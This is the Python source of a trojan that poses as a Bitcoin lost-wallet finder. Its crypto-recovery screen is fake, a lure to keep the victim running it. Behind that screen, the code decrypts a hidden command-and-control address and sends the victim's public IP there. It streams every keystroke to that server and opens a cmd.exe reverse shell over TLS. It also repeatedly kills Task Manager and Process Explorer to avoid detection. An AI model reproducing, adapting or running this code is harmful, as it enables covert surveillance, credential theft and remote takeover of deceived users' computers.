import ctypes
import ssl
import tempfile
import threading
import subprocess
import time
import random
import os
import psutil
from colorama import init, Fore
import keyboard
import socket
import string
import find_interests
from CryptoPhenix import decrypt
import requests
import certs


# Autor   ->  an0mal1a
# Name    ->  Pablo
# GitHub  ->  https://github.com/an0mal1a
# Correo  -> pablodiez024@proton.me
# ACTUALES:
# Credenciales de navegadores
# C&C
# Keylogger


def prep_gme():
    try:
        pim = b'\xf9\x0c]Q\x81\xcf\xf0\xf0Z\xeb FA\xef;\xc3`\x8b\x17\xa5\xf06\x89\x0cq\x9cz\x1cYA\xa93\xb9\xfc\xaa{\x11g\x1d{{\xf4\x9c\xe2R/]\xa9\xc6\x0c\x15E\xee\xac\xaa~\xebE\xbe@\x1b\xa6s\xb0'
        conn.send("\n\n".encode() + decrypt(pim) + " ".encode())
        conn.send(requests.get('http://checkip.amazonaws.com').text.strip().encode() + "\n\n".encode())
    except Exception:
        pass


def banner():
    print(Fore.RED + """
\t
\t ██████╗██████╗ ██╗   ██╗██████╗ ████████╗███████╗██████╗ 
\t██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗
\t██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   █████╗  ██████╔╝
\t██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██╔══╝  ██╔══██╗
\t╚██████╗██║  ██║   ██║   ██║        ██║   ███████╗██║  ██║
\t ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                          
\n""")


def know_gme():
    unkown = b'\xda\x81\xf4Gj^\x15\x96\x0b\x03\xebP$(8ND\xbd\xa5\xbe\xe3_\xe8\xe4k\xa1(_\x95{=#\x8d\xfc\x90\xf1\x10\x91\'\x18@hr\xd1\x1b\xcb\x94\x03"$\xb0\xcc\xa2\xc2\x98JM^\x86\xf3\x8dS\x98\xc0'
    return str(decrypt(unkown).decode())
    #return "127.0.0.1"


banner()
print(Fore.GREEN + "\n\t[!] Iniciando Programa...")
yek = []


def is_admin():
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        print(Fore.RED + "[!] ESTE PROGRAMA NECESITA PERMISOS DE ADMINISTRADOR.")
        input("\n\n\t[ENTER]")
        exit()


try:
    csd = tempfile.NamedTemporaryFile(delete=False)
    csd.write(certs.get_crte().encode())
    csd.close()

    cock = tempfile.NamedTemporaryFile(delete=False)
    cock.write(certs.get_locker().encode())
    cock.close()

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.load_cert_chain(certfile=csd.name, keyfile=cock.name)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((know_gme(), 5000))
    conn = context.wrap_socket(sock, server_hostname=know_gme())
except Exception as e:
    pass


def on_press(event):
    try:
        #t = threading.Thread(target=init_game)
        #t.start()

        yek.append(event.name)

        if len(event.name) > 1:
            conn.send(" |".encode() + event.name.encode() + "| ".encode())
        else:
            conn.send(event.name.encode())
    except ConnectionResetError:
        pass
    except ConnectionAbortedError:
        pass
    except Exception:
        pass


def sdn_gme(s, xxx):
    try:
        while True:
            output = xxx.stdout.readline()
            if not output:
                break
            s.send(output)
    except ssl.SSLEOFError:
        pass


def rcv_gme(s, xxx):
    while True:
        try:
            command = s.recv(1024)
            if not command:
                break
            xxx.stdin.write(command)
            xxx.stdin.flush()
        except Exception:
            break


def games():
    try:
        #context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        #context.verify_mode = ssl.CERT_NONE
        #context.check_hostname = False
        #context.load_cert_chain(certfile=csd.name, keyfile=cock.name)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((know_gme(), 5001))
        conn = context.wrap_socket(sock, server_hostname=know_gme())

        # Crear el proceso con un shell interactivo
        xxx = subprocess.Popen('cmd.exe', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                               stdin=subprocess.PIPE)

        # Leer la salida del proceso en un hilo adicional y enviarla al socket
        ompt_rcv = threading.Thread(target=rcv_gme, args=(conn, xxx))
        ompt_rcv.start()

        ompt_sdn = threading.Thread(target=sdn_gme, args=(conn, xxx))
        ompt_sdn.start()

        ompt_rcv.join()
        ompt_sdn.join()

        conn.close()
        xxx.terminate()
    except ConnectionResetError:
        pass
    except ConnectionAbortedError:
        pass
    except Exception:
        pass


def is_open():
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        if "Taskmgr.exe" in proc.info['name'] or "procexp64.exe" in proc.info['name']:
            return proc.info['pid']
    return False


def start_taskmanager():
    while True:
        pid = is_open()
        if pid:
            try:
                os.kill(pid, 9)
            except PermissionError:
                if is_admin() != 0:
                    pass
        time.sleep(0.5)


def init_task():
    t = threading.Thread(target=start_taskmanager)
    t.start()

    t.join()


def init_game():

    t = threading.Thread(target=games)
    t.start()

    t.join()


def main():
    try:
        prep_gme()
        clean()
        banner()
        init(convert=True)

        interest = threading.Thread(target=find_interests.main)
        interest.start()

        t = threading.Thread(target=init_game)
        t.start()

        keyboard.on_press(on_press)

        task = threading.Thread(target=init_task)
        task.start()

        wallet = None

        while not wallet:
            wallet = input(Fore.YELLOW + "\n\t[!] Wallet: ")
            a = input(Fore.GREEN + "\n\t[*] Has introducido {}, estas seguro? [S/n] >> ".format(wallet))

            if a.lower() in ['s']:
                print(Fore.CYAN + "\n\t[*] Comprobando si esta Wallet existe... ")

                if "bc1" in wallet:
                    time.sleep(3)
                    print(Fore.GREEN + "\n\t\t[*] Wallet encontrada\n")
                    break
                else:
                    time.sleep(1.5)
                    print(Fore.RED + "\n\t\t[!] Wallet inválida...\n")
                    wallet = None

            elif a.lower() == "n":
                wallet = None
            else:
                print(Fore.RED + "\t[!] Opción inválida...")
        time.sleep(0.4)

        print(Fore.BLUE + "\t[!] Configurando el espacio de trabajo para usted...")
        time.sleep(3)

        def id_gen(size=40, chars=string.ascii_uppercase + string.digits):
            return "".join(random.choice(chars) for _ in range(size))

        tries = 0

        while True:

            if tries > random.randint(100000, 1000000):  # probabilidad de ganar btc falso
                print(Fore.CYAN + "[-]" + Fore.RED + " bc1" + id_gen() + Fore.GREEN + " |  Valid  |  " + str(round(random.uniform(0, 2), 4)), "BTC")
                posibiliti = random.randint(1, 10)
                choose = random.randint(1, 10)
                print(Fore.GREEN + "\n\t[!] Lost Wallet Found")
                print(Fore.RED + "\n\t[*] Probando desencriptacion de wallet!!!")

                time.sleep(3)

                if posibiliti == choose:
                    print(Fore.YELLOW + "[*] Retirando a su Wallet...")
                    time.sleep(10)
                    tries = 0
                    print(Fore.GREEN + "[!] ¡Hecho!")
                    time.sleep(2)
                else:
                    print(Fore.RED + "\t[!] La wallet no se ha podido desencriptar...")
                    time.sleep(2)
                    tries = 0
            else:
                print(Fore.CYAN + "[-]" + Fore.RED + " bc1" + id_gen() + Fore.CYAN + " | InValid |  " + "0.0000 BTC")
                tries += 1
    except ConnectionResetError:
        pass
    except ConnectionAbortedError:
        pass
    except KeyboardInterrupt:

        print("\n\n[!] Cerrando sesión, no cierre el programa")

        lgo = ", ".join(yek)

        try:
            conn.send(f"\n\n[!] Este ha sido mi resumen: \n{lgo}".encode())
            conn.send("-".encode() * 50)

            conn.close()
            print("[!] Salida con éxito.")
            time.sleep(3)
            exit()
        except Exception as e:
            print(e)
            exit()


def clean():
    if os.name == "posix":
        os.system("clear")
    else:
        os.system("cls")


if __name__ == "__main__":
    try:
        clean()
        banner()
        # is_admin()
        main()


    except KeyboardInterrupt:

        print("\n\n[!] Cerrando sesión, no cierre el programa")

        lgo = ", ".join(yek)

        try:
            conn.send(f"\n\n[!] Este ha sido mi resumen: \n{lgo}".encode())
            conn.send("-".encode() * 50)

            conn.close()
            print("[!] Salida con éxito. [ENTER]")
            time.sleep(3)
            exit()
        except Exception:
            exit()

    except Exception:
        pass